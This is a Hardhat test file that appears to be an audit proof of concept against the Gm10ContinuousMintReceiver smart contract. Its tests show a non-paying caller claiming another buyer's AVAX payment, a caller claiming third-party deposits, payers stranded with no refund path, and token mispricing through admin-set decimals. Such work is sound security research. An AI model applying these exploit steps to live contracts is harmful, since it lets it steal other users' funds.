const { expect } = require("chai");
const hre = require("hardhat");
const { ethers } = hre;
const { time } = require("@nomicfoundation/hardhat-network-helpers");

const NATIVE_AVAX = ethers.ZeroAddress;

async function deployContinuousMintReceiverFixture() {
  const [
    owner,
    coreTeam,
    governanceTreasury,
    communityEcosystem,
    advisors,
    strategicPartnerships,
    buyer,
    treasury,
    attacker,
    thirdParty,
  ] = await ethers.getSigners();

  const Controller = await ethers.getContractFactory("Gm10TokenomicsV7Controller");
  const controller = await Controller.deploy(
    owner.address,
    coreTeam.address,
    governanceTreasury.address,
    communityEcosystem.address,
    advisors.address,
    strategicPartnerships.address
  );
  await controller.waitForDeployment();

  const Fund = await ethers.getContractFactory("MockGemMintStrategyFundV8");
  const fund = await Fund.deploy(await controller.getAddress());
  await fund.waitForDeployment();
  await fund.initializeV8();
  await fund.mintForTest(owner.address, ethers.parseEther("100"));
  await fund.setStableAccountingForTest(100_000_000n, 0n, 0n, 0n, 0n, 0n);
  await fund.syncStableNavForTest();
  const MockAggregator = await ethers.getContractFactory("MockAggregatorV3");
  const avaxUsdFeed = await MockAggregator.deploy(8, 9_12000000n);
  await avaxUsdFeed.waitForDeployment();
  await fund.setAvaxPricingForTest(await avaxUsdFeed.getAddress(), 86_400n);
  await fund.grantGovernanceForTest(owner.address);
  await fund.setContinuousAccrualControls(false, true, true, -500);

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const usdc = await MockERC20.deploy("Mock USDC", "USDC");
  await usdc.waitForDeployment();

  const Receiver = await ethers.getContractFactory("Gm10ContinuousMintReceiver");
  const receiver = await Receiver.deploy(
    await fund.getAddress(),
    treasury.address,
    owner.address,
    await usdc.getAddress(),
    6
  );
  await receiver.waitForDeployment();
  await fund.grantManagerForTest(await receiver.getAddress());

  return {
    fund,
    controller,
    receiver,
    usdc,
    owner,
    buyer,
    treasury,
    attacker,
    thirdParty,
    MockERC20,
  };
}

async function latestTimestamp() {
  return (await ethers.provider.getBlock("latest")).timestamp;
}

async function registerNative(receiver, signer, commitId, providerRouteId, minSettlementAmount, expiresAt) {
  return receiver.connect(signer).registerCommit(
    commitId,
    providerRouteId,
    signer.address,
    NATIVE_AVAX,
    minSettlementAmount,
    expiresAt
  );
}

describe("Gm10ContinuousMintReceiver native AVAX attribution PoC", function () {
  it("lets a non-paying caller settle another buyer's AVAX and stick the payer", async function () {
    const { fund, controller, receiver, buyer, attacker } = await deployContinuousMintReceiverFixture();
    const payment = ethers.parseEther("1");
    const attackerMin = 1n;
    const expiresAt = (await latestTimestamp()) + 3600;
    const attackerCommitId = ethers.id("poc-attacker-commit");
    const attackerRouteId = ethers.id("poc-attacker-route");
    const buyerCommitId = ethers.id("poc-buyer-commit");
    const buyerRouteId = ethers.id("poc-buyer-route");
    const quotedUsdt6 = 9_120000n;
    const [buyerCatch18, segmentCatchEach18] = await fund.previewContinuousMint(quotedUsdt6);
    const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);

    await registerNative(receiver, attacker, attackerCommitId, attackerRouteId, attackerMin, expiresAt);
    await registerNative(receiver, buyer, buyerCommitId, buyerRouteId, payment, expiresAt);

    const attackerCommit = await receiver.commits(attackerCommitId);
    const buyerCommit = await receiver.commits(buyerCommitId);
    expect(attackerCommit.escrow).to.equal(await fund.getAddress());
    expect(buyerCommit.escrow).to.equal(await fund.getAddress());
    expect(attackerCommit.fundAvaxBalanceBefore).to.equal(buyerCommit.fundAvaxBalanceBefore);
    expect(attackerCommit.accountedFundAvaxBefore).to.equal(buyerCommit.accountedFundAvaxBefore);

    await buyer.sendTransaction({ to: await fund.getAddress(), value: payment });

    await receiver.connect(attacker).commitSettledRoute(
      attackerCommitId,
      attackerRouteId,
      attacker.address,
      NATIVE_AVAX,
      payment
    );

    expect(await fund.balanceOf(attacker.address)).to.equal(buyerCatch18);
    expect(await fund.balanceOf(buyer.address)).to.equal(0n);
    expect(await ethers.provider.getBalance(await fund.getAddress())).to.equal(
      attackerCommit.fundAvaxBalanceBefore + payment
    );
    expect(await receiver.accountedFundAvaxSettlementWei()).to.equal(payment);
    expect(await fund.accountedFundAvaxSettlementWei()).to.equal(payment);
    expect((await fund.stableAccounting()).liquidTreasury).to.equal(100_000_000n + ((quotedUsdt6 * 9_000n) / 10_000n));
    for (let segment = 0; segment < 5; segment += 1) {
      const recipient = await controller.segmentRecipient(segment);
      expect(await fund.balanceOf(recipient)).to.equal(segmentCatchEach18);
    }

    await expect(
      receiver.connect(buyer).commitSettledRoute(
        buyerCommitId,
        buyerRouteId,
        buyer.address,
        NATIVE_AVAX,
        payment
      )
    ).to.be.revertedWithCustomError(receiver, "InsufficientSettlementBalance");

    const buyerCommitAfter = await receiver.commits(buyerCommitId);
    expect(buyerCommitAfter.settled).to.equal(false);
    expect(await ethers.provider.getBalance(attacker.address)).to.be.closeTo(attackerBalanceBefore, ethers.parseEther("0.01"));
  });

  it("lets a pre-registered caller claim AVAX that a third party sent to the fund", async function () {
    const { fund, receiver, attacker, thirdParty } = await deployContinuousMintReceiverFixture();
    const inflow = ethers.parseEther("2");
    const expiresAt = (await latestTimestamp()) + 86_400;
    const commitId = ethers.id("poc-third-party-inflow");
    const routeId = ethers.id("poc-third-party-route");
    const [expectedCatch] = await fund.previewContinuousMint(18_240000n);

    await registerNative(receiver, attacker, commitId, routeId, 1n, expiresAt);
    const snapshot = (await receiver.commits(commitId)).fundAvaxBalanceBefore;

    await thirdParty.sendTransaction({ to: await fund.getAddress(), value: inflow });

    await receiver.connect(attacker).commitSettledRoute(
      commitId,
      routeId,
      attacker.address,
      NATIVE_AVAX,
      inflow
    );

    expect(await fund.balanceOf(attacker.address)).to.equal(expectedCatch);
    expect(await fund.balanceOf(thirdParty.address)).to.equal(0n);
    expect(await ethers.provider.getBalance(await fund.getAddress())).to.equal(snapshot + inflow);
  });

  it("does not let a caller claim AVAX that was already in the fund at registration", async function () {
    const { fund, receiver, attacker, thirdParty } = await deployContinuousMintReceiverFixture();
    const preexisting = ethers.parseEther("5");
    const expiresAt = (await latestTimestamp()) + 3600;
    const commitId = ethers.id("poc-preexisting-balance");
    const routeId = ethers.id("poc-preexisting-route");

    await thirdParty.sendTransaction({ to: await fund.getAddress(), value: preexisting });
    await registerNative(receiver, attacker, commitId, routeId, preexisting, expiresAt);

    await expect(
      receiver.connect(attacker).commitSettledRoute(
        commitId,
        routeId,
        attacker.address,
        NATIVE_AVAX,
        preexisting
      )
    ).to.be.revertedWithCustomError(receiver, "InsufficientSettlementBalance");
    expect(await fund.balanceOf(attacker.address)).to.equal(0n);
  });

  it("leaves a native payer unable to settle or reclaim after the fund balance drops", async function () {
    const { fund, receiver, buyer } = await deployContinuousMintReceiverFixture();
    const payment = ethers.parseEther("1");
    const expiresAt = (await latestTimestamp()) + 600;
    const commitId = ethers.id("poc-balance-drop");
    const routeId = ethers.id("poc-balance-drop-route");

    await registerNative(receiver, buyer, commitId, routeId, payment, expiresAt);
    const snapshot = (await receiver.commits(commitId)).fundAvaxBalanceBefore;
    await buyer.sendTransaction({ to: await fund.getAddress(), value: payment });

    await hre.network.provider.send("hardhat_setBalance", [
      await fund.getAddress(),
      ethers.toQuantity(snapshot),
    ]);

    await expect(
      receiver.connect(buyer).commitSettledRoute(commitId, routeId, buyer.address, NATIVE_AVAX, payment)
    ).to.be.revertedWithCustomError(receiver, "InsufficientSettlementBalance");

    await time.increaseTo(expiresAt + 1);
    await hre.network.provider.send("hardhat_setBalance", [
      await fund.getAddress(),
      ethers.toQuantity(snapshot + payment),
    ]);

    await expect(
      receiver.connect(buyer).commitSettledRoute(commitId, routeId, buyer.address, NATIVE_AVAX, payment)
    ).to.be.revertedWithCustomError(receiver, "CommitExpired");

    const commit = await receiver.commits(commitId);
    expect(commit.settled).to.equal(false);
    expect(commit.escrow).to.equal(await fund.getAddress());
    expect(await fund.balanceOf(buyer.address)).to.equal(0n);
    const functionNames = receiver.interface.fragments
      .filter((fragment) => fragment.type === "function")
      .map((fragment) => fragment.name);
    expect(functionNames).to.not.include.members([
      "cancelCommit",
      "refund",
      "refundCommit",
      "claimRefund",
      "expireCommit",
    ]);
    expect(await ethers.provider.getBalance(await fund.getAddress())).to.equal(snapshot + payment);
  });

  it("prices an approved ERC20 only from admin-supplied decimals and treats it as 1 USD", async function () {
    const { fund, receiver, buyer, attacker, owner, MockERC20 } = await deployContinuousMintReceiverFixture();
    const volatile = await MockERC20.deploy("Volatile Receipt", "VOL");
    await volatile.waitForDeployment();
    expect(await volatile.decimals()).to.equal(18n);

    await expect(
      receiver.connect(attacker).configureSettlementToken(await volatile.getAddress(), true, 0)
    ).to.be.revertedWithCustomError(receiver, "AccessControlUnauthorizedAccount");

    await receiver.connect(owner).configureSettlementToken(await volatile.getAddress(), true, 18);
    const oneToken = ethers.parseEther("1");
    const oneUsd = 1_000_000n;
    const [catchForOneUsd] = await fund.previewContinuousMint(oneUsd);
    const [catchIfDecimalsWereSix] = await fund.previewContinuousMint(oneToken);
    expect(catchIfDecimalsWereSix / catchForOneUsd).to.equal(10n ** 12n);
    const expiresAt = (await latestTimestamp()) + 3600;
    const commitId = ethers.id("poc-admin-decimals-18");
    const routeId = ethers.id("poc-admin-decimals-18-route");

    await receiver.connect(buyer).registerCommit(
      commitId,
      routeId,
      buyer.address,
      await volatile.getAddress(),
      oneToken,
      expiresAt
    );
    const escrow = (await receiver.commits(commitId)).escrow;
    await volatile.mint(escrow, oneToken);

    await receiver.connect(buyer).commitSettledRoute(
      commitId,
      routeId,
      buyer.address,
      await volatile.getAddress(),
      oneToken
    );

    expect(await fund.balanceOf(buyer.address)).to.equal(catchForOneUsd);

    await receiver.connect(owner).configureSettlementToken(await volatile.getAddress(), true, 6);
    const inflatedCommitId = ethers.id("poc-admin-decimals-6");
    const inflatedRouteId = ethers.id("poc-admin-decimals-6-route");
    const [inflatedCatch] = await fund.previewContinuousMint(oneToken);
    expect(inflatedCatch).to.be.gt(catchForOneUsd);

    await receiver.connect(buyer).registerCommit(
      inflatedCommitId,
      inflatedRouteId,
      buyer.address,
      await volatile.getAddress(),
      oneToken,
      expiresAt
    );
    const inflatedEscrow = (await receiver.commits(inflatedCommitId)).escrow;
    await volatile.mint(inflatedEscrow, oneToken);
    await receiver.connect(buyer).commitSettledRoute(
      inflatedCommitId,
      inflatedRouteId,
      buyer.address,
      await volatile.getAddress(),
      oneToken
    );

    expect(await fund.balanceOf(buyer.address)).to.equal(catchForOneUsd + inflatedCatch);
  });
});
